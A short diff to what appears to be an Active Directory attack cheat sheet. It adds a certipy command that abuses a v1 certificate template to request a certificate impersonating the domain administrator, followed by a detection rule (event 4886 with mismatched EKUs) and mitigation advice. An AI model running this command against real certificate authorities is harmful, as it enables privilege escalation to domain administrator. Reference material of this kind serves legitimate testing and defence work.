@@ -21,3 +21,13 @@ tag: null
 
 ### Commands
 ```bash
+# ── Request with manipulated EKUs ────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template V1Template \
+  -upn administrator@corp.local
+```
+
+### Detection
+**4886** where **request EKUs ≠ template EKUs**; patch the CA; restrict v1 templates.
+
+---
